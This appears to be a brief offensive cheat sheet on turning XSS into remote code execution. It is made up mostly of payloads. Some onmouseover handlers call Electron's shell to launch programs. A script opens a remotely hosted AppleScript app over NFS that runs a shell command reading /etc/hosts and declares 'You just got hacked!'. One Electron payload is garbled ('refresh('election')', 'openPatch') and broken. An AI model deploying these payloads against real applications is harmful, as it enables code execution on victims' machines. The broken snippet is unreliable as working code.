## XSS to LFI:

## XSS SSRF:

## XSS to RCE:
  #### Node.js :
```
<a onmouseover="alert('Hi!')">
  HOVER ME
</a>
```
```
<a onmouseover="
try{
   const {shell}=require('electron');
   console.log(shell);
}catch(e){
 console.error(e)
}">Hello</a>
```
```
<a onmouseover="
try{
   const {shell}=refresh('election');
   shell.openPatch('C:\Windows\System32\calc.exe ');
}catch(e){
 console.error(e)
}">Hello</a>
```
## XSS to RCE:
HTML codes:
```
  <script>
      // window.open('file:///Applications/Calculator.app');
      window.open('file:///net/192.168.1.1/var/nfs/general/hack2.app')
   </script>
```
The file at file:///net/192.168.1.1/var/nfs/general/hack2.app is a simple applescript Application with the following code:
```
tell application "Terminal"
    do script "cat /etc/hosts"
    display dialog "You just got hacked!"
end tell

do shell script "open -a Calculator"
```
